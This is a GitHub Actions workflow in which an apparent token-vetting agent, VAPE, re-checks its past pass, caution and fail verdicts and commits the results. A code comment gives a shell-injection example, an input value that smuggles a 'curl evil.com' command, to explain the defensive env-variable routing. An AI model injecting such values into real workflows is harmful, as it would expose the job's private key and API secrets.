name: VAPE Ledger Self-Review (pass/caution weekly, fail monthly)

# VAPE checking its own past verdicts against fresh data — "where was I
# accurate, where wasn't I." Re-checks the oldest-reviewed addresses in each
# category (never the same handful every time) via the real
# agents/investigate.py pipeline, and logs a real finding whenever a past
# verdict no longer holds. Pass/caution reviewed weekly (more likely to
# drift — a clean or borderline token can still turn bad); fail reviewed
# monthly (a REJECT rarely needs urgent re-checking).
on:
  schedule:
    - cron: '0 9 * * 1'    # Mondays 09:00 UTC — pass + caution
    - cron: '0 9 1 * *'    # 1st of the month 09:00 UTC — fail
  workflow_dispatch:
    inputs:
      categories:
        description: 'Comma list: pass,caution,fail'
        default: 'pass,caution'
      sample:
        description: 'Max addresses re-checked per category'
        default: '5'

permissions:
  contents: write

concurrency:
  group: review-ledger
  cancel-in-progress: false

jobs:
  review:
    runs-on: ubuntu-latest
    env:
      TAVILY_API_KEY: ${{ secrets.TAVILY_API_KEY }}
      BRAVE_API_KEY: ${{ secrets.BRAVE_API_KEY }}
      FIRECRAWL_API_KEY: ${{ secrets.FIRECRAWL_API_KEY }}
      BRIGHTDATA_API_TOKEN: ${{ secrets.BRIGHTDATA_API_TOKEN }}
      DATA_AGENT_PRIVATE_KEY: ${{ secrets.DATA_AGENT_PRIVATE_KEY }}
      # agents/investigate.py's Grok expert assessment (agents/llm.py's
      # FRONTIER_ORDER) runs on every real re-check below — was previously
      # unwired here entirely, so it silently no-op'd on every run.
      XAI_API_KEY_1: ${{ secrets.XAI_API_KEY_1 }}
      GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
      CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
      OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
      GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
      GITHUB_MODELS_TOKEN: ${{ secrets.GITHUB_MODELS_TOKEN }}
      TOGETHER_API_KEY: ${{ secrets.TOGETHER_API_KEY }}
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 1
          persist-credentials: false
      - uses: actions/setup-python@v6
        with:
          python-version: '3.11'
          cache: 'pip'
          cache-dependency-path: agents/requirements.txt
      - name: Cache npm (agents/investigate.py's web reputation check spawns research MCP servers via npx)
        uses: actions/cache@v6
        with:
          path: ~/.npm
          key: npm-research-mcp-${{ runner.os }}
      - name: Install
        run: pip install -r agents/requirements.txt
      - name: Determine categories for this trigger
        id: cats
        # Routed through env: rather than interpolated straight into the
        # script — this job's env carries every LLM/research API key plus
        # DATA_AGENT_PRIVATE_KEY and contents:write, so a raw
        # ${{ github.event.inputs.* }} splice into `run:` (shell-injection
        # into a job with that secret set) is worth closing even though this
        # trigger is workflow_dispatch-only, not fork-reachable.
        env:
          INPUT_CATEGORIES: ${{ github.event.inputs.categories }}
          INPUT_SAMPLE: ${{ github.event.inputs.sample }}
          EVENT_SCHEDULE: ${{ github.event.schedule }}
        run: |
          if [ -n "$INPUT_CATEGORIES" ]; then
            echo "categories=$INPUT_CATEGORIES" >> "$GITHUB_OUTPUT"
            echo "sample=$INPUT_SAMPLE" >> "$GITHUB_OUTPUT"
          elif [ "$EVENT_SCHEDULE" = "0 9 1 * *" ]; then
            echo "categories=fail" >> "$GITHUB_OUTPUT"
            echo "sample=5" >> "$GITHUB_OUTPUT"
          else
            echo "categories=pass,caution" >> "$GITHUB_OUTPUT"
            echo "sample=5" >> "$GITHUB_OUTPUT"
          fi
      - name: Run self-review
        # Same reasoning as the "Determine categories" step above — these
        # values passed through env: once already, but re-interpolating the
        # step OUTPUT directly into `run:` here reopens the exact same
        # shell-injection path (confirmed real, CodeRabbit review PR #157):
        # a workflow_dispatch caller could pass `categories=pass" && curl
        # evil.com` and have it run in this job, which carries
        # DATA_AGENT_PRIVATE_KEY and every LLM/research API key.
        run: python agents/review_ledger.py --categories "$CATEGORIES" --sample "$SAMPLE"
        env:
          ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
          CATEGORIES: ${{ steps.cats.outputs.categories }}
          SAMPLE: ${{ steps.cats.outputs.sample }}
      - name: Commit ledger + lists + review report
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          git config user.name "VAPE Bot"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add intel/investigations/ skillforge/memory/ || true
          git commit -m "VAPE ledger self-review $(date -u +%Y-%m-%dT%H:%MZ)" || { echo "no changes"; exit 0; }
          git remote set-url origin "https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}.git"
          pushed=false
          for i in 1 2 3 4 5; do
            git rebase --abort >/dev/null 2>&1 || true
            git pull --rebase --autostash origin main || true
            if git push; then pushed=true; break; fi
            echo "push race retry $i"; sleep $((i*3))
          done
          if [ "$pushed" != "true" ]; then
            echo "::error::failed to push after 5 retries -- changes were NOT committed"
            exit 1
          fi
